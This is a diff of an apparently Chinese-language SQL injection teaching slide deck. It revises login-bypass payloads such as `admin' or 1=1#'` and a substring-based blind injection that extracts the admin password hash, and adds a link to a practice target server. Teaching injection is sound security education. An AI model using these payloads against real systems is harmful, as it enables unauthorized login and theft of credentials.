@@ -52,12 +52,7 @@ SELECT * from Users
 
 密碼不對啥都沒有
 
-```text
- +----------+--------------------------------------+
- | user     | password                             |
- +----------+--------------------------------------+
- +----------+--------------------------------------+
-```
+![](https://i.imgur.com/WOeMBJM.png)
 
 ---
 
@@ -78,7 +73,7 @@ SELECT * from Users
 
 這行拿去跑會噴錯誤
 
-> ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'meow')' at line 1
+![](https://i.imgur.com/nIMeDb6.png)
 
 ---
 
@@ -86,40 +81,52 @@ SELECT * from Users
 
 --
 
-帳號: `admin' or 1=1--'` 密碼: meow
+帳號: `admin' or 1=1#'` 密碼: meow
 
 ```sql
 SELECT * from Users
-  where user = 'admin' or 1=1--' and password = md5('meow');
+  where user = 'admin' or 1=1#'' and password = md5('meow');
 ```
+
+> 上面那個是語法 highlight 的問題 `#` 後面應該會是註解色
 
 --
 
 OOPS
 
-```text
- +----------+--------------------------------------+
- | user     | password                             |
- +----------+--------------------------------------+
- | admin    | 5f4dcc3b5aa765d61d8327deb882cf99     |
- +----------+--------------------------------------+
-```
+![](https://i.imgur.com/QT9mOZK.png)
 
 --
 
 這是最基本的邏輯注入
 
-讓他選出 admin 的資料
+讓他倒出全部的資料
+
+然後也因為有選出東西，所以就可以跳過登入了
+
+--
+
+[試打看看](http://140.134.208.86:13001)
 
 ---
 
-或者偷看某個東西對不對
+---
+
+---
+
+或者可以偷看某個東西對不對
 
 像是你只知道成不成功的時候
 
 --
 
-帳號: `admin' or substring((select password from Users where user = 'admin' limit 1),1,1)='a'--'`
+而 SQL 是允許把一個 query 的結果當成另一個 query 或是函式的參數
+
+
+
+--
+
+帳號: `admin' or substring((select password from Users where user = 'admin' limit 1),1,1)='a'#'`
 
 密碼: meow
 
